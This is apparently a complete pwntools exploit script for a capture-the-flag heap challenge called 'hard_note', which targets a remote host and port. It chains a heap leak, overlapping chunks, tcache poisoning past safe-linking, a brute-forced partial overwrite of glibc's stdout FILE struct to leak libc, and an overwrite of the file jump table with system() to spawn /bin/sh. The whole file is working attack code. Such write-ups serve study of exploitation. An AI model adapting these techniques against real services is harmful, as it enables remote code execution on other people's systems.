from pwn import *
import sys

libc = ELF("libc.so.6")
if sys.argv[1] == "r":
    p = remote("45.122.249.68", 10009)
else:
    p = process("./hard_note_patched", env={"LD_PRELOAD":"libc.so.6"})
    context.terminal = ["tmux", "splitw", "-h"]
    gdb.attach(p, """ 
                continue
                    """)

def create(index, size, data, stdout=True):
    if stdout:
        p.sendlineafter("> ", "1")
        p.sendlineafter("Index: ", str(index))
        p.sendlineafter("Size: ", str(size))
        p.sendafter("Data: ", data)
    else:
        print "closed"
        sleep(1)
        p.sendline("1")
        sleep(1)
        p.sendline(str(index))
        sleep(1)
        p.sendline(str(size))
        sleep(1)
        p.send(data)
        sleep(1)

def delete(index, stdout=True):
    if stdout:
        p.sendlineafter("> ", "2")
        p.sendlineafter("delete: ", str(index))
    else:
        sleep(1)
        p.sendline("1")        
        sleep(1)
        p.sendline(str(index))

def safe_linking(ptr, fw):
    return (ptr >> 12) ^ fw

def solve():
    p.recvuntil("I have a gift for you: ")
    heap_leak = int(p.recv(14), 16)
    heap_base = heap_leak - 0x2a0
    success("heap leak: %s"%hex(heap_leak))
    success("heap base: %s"%hex(heap_base))

    # heap consolidation to overlap a tcache chunk
    create(0, 0x38, p64(0) + p64(0x71) + p64(heap_leak + 0x20)*2)
    create(1, 0x38, "B"*0x20)
    create(2, 0x4f8, "C"*0xf0)
    create(3, 0x30, "C\n")
    delete(1)
    create(1, 0x38, "B"*0x30 + p64(0x70))
    delete(2)

    # tcache poison to point the tcache to tcache_perthread_struct
    delete(3)
    delete(1)
    create(1, 0x40, p64(0)*5 + p64(0x41) + p64(safe_linking(heap_base + 0x300, heap_base+0x10)) + p64(0))
    
    # create a fake chunk in tcache_perthread_struct, heap consolidation again => create a unsorted bin in tcache_perthread_struct 
    create(2, 0x30, "\n")
    create(4, 0x30, p64(0) + p64(0x321) + p64(heap_base+0x10)*2)

    create(5, 0x18, "B"*0x10 + p64(0x320))
    create(6, 0x4f0, "C"*0xf0)
    delete(5)
    delete(6)
    
    delete(2)
    delete(1)
    delete(0)


    # now we have an unsorted bin in tcache_perthread_struct
    # spray count of tcache lists
    create(1, 0x60, p32(7)*12 + p16(7)*7 + p16(6)*7 +  p16(5)*7 + p16(4)*3)
    
    # create a chunk from unsorted bin => put a libc address to tcache list, parital overwrite its 2 lsb bytes to stdout struct
    # need brute forcing with 1/16 chances
    create(3, 0x100, p64(0) + "\x60\xa7")
    delete(4)
    create(4, 0x20, p64(0xfbad1800) + p64(0)*3)

    chunk = p.recv(20)
    pos = 100
    if "\x7f" in chunk:
        pos = chunk.find("\x7f")
    elif "\x7e" in chunk:
        pos = chunk.find("\x7e")
    else:
        success("Failed to find leak")
        p.close()
    leak = u64(chunk[pos-5:pos+1].ljust(8, b"\x00"))
    libc.address = leak - 0x21b720 # 0x1bc744
    system = libc.symbols["system"]
    stdout = libc.symbols["_IO_2_1_stdout_"]
    stdin = libc.symbols["_IO_2_1_stdin_"]
    binsh = next(libc.search("/bin/sh\x00"))
    __GI__IO_file_jumps = libc.address + 0x21a560
    success("libc: %s"%hex(libc.address))
    success("stdout: %s"%hex(stdout))
    success("stdin: %s"%hex(stdin))
    success("filler: %s"%hex(libc.address+0x2197e3))
    # success("__GI__IO_file_jumps: %s"%hex(libc.symbols["__GI__IO_file_jumps"]))

    filler = libc.address + 0x2197e3
    stdout_FILE = (p64(filler)*4
            + p64(filler + 1)*2
            + p64(filler)
            + p64(filler + 1)
            + p64(0)*4
            + p64(libc.address + 0x218a80)
            + p64(1)
            + p64(0xffffffffffffffff)
            + p64(0x000000000a000000)
            + p64(libc.address + 0x21b730)
            + p64(0xffffffffffffffff)
            + p64(0)
            + p64(libc.address + 0x218980)
            + p64(0)*3
            )
    
    # put libc address in tcache list again, partial overwrite to stdout struct 
    # overwrite stdout struct to close stdout
    partial_stdout = p64(stdout)[:2]
    create(5, 0x40, p64(0) + partial_stdout)    
    create(7, 0x240, p64(0xfbad2887) + stdout_FILE + p32(1))        # close stdout
   
    # do that trick again, this time we overwrite __GI__IO_file_jumps with p64(0)*2 + p64(system)*2
    partial_file_jumps = p64(__GI__IO_file_jumps)[:2]
    create(0, 0x40, p64(0) + partial_file_jumps, stdout=False)
    create(2, 0x2e0, p64(0)*2 + p64(system)*2, stdout=False)
    
    # do that trick again :(, overwrite stdout struct to trigger shell
    create(5, 0x40, p64(0) + partial_stdout, stdout=False)
    create(6, 0x380, "/bin/sh\x00" + stdout_FILE + p32(0xffffffff), stdout=False)

    p.interactive()

if __name__ == "__main__":
    solve()
